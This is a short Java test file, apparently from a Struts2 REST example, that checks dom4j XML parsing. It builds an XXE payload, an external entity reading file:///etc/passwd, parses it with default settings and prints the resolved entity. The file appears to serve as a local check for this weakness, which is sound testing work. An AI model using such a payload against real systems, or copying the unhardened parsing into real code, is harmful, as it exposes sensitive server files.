package it.org.apache.struts2.rest.example;

import org.dom4j.Document;
import org.dom4j.DocumentException;
import org.dom4j.DocumentHelper;
import org.dom4j.Element;

import java.text.ParseException;

public class Test {
    public static void main(String[] args) throws ParseException, DocumentException {
//        Date date1 = new Date();
//        String strDate = date1.toString();
//        System.out.println("raw strDate = " + strDate);
//        String pat = "yyyy-MM-dd HH:mm:ss Z";
//        SimpleDateFormat sdf = new SimpleDateFormat(pat);
//        // with default locale--chinese, and default DateFormatSymbols
//        System.out.println(sdf.format(date1));
//        System.out.println(testTry());
        String xxeContent = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                "<!DOCTYPE lltest[\n" +
                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n" +
                "]> \n" +
                "<user><username>&xxe;</username><password>123456</password></user>";
        Document doc = DocumentHelper.parseText(xxeContent);
        //doc;
        Element root = doc.getRootElement();

        System.out.println(root.element("username").getData());
    }

    public static String testTry() {
        try {
            return "called";
        } finally {
            System.out.println("executed?");
        }
    }
}
